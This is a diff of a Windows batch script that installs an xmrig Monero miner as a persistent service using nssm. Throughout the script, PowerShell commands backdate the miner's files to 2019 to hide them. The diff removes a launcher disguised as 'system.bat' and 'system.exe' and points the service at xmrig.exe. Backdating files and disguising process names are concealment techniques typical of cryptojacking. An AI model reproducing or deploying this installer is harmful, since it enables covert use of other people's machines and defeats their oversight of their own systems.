@@ -317,15 +317,6 @@ echo :EXIT
 ) > "%USERPROFILE%\moneroocean\miner.bat"
 
 
-(
-echo start "%USERPROFILE\moneroocean\" xmrig.exe
-echo mkdir "%USERPROFILE\moneroocean\sys"
-echo rmdir "%USERPROFILE\moneroocean\sys"
-) > "%USERPROFILE%\moneroocean\system.bat"
-
-
-
-
 
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').CreationTime=('3 August 2019 17:00:00')"
@@ -336,13 +327,6 @@ powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config_background.json
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').CreationTime=('3 August 2019 17:00:00')"
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').LastWriteTime=('3 August 2019 17:00:00')"
-
-
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\system.bat').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\system.bat').LastWriteTime=('3 August 2019 17:00:00')"
-
-
-
 
 
 
@@ -415,7 +399,7 @@ del "%USERPROFILE%\nssm.zip"
 echo [*] Creating moneroocean_miner service
 sc stop moneroocean_miner
 sc delete moneroocean_miner
-"%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\system.exe"
+"%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\xmrig.exe"
 if errorlevel 1 (
   echo ERROR: Can't create moneroocean_miner service
   exit /b 1
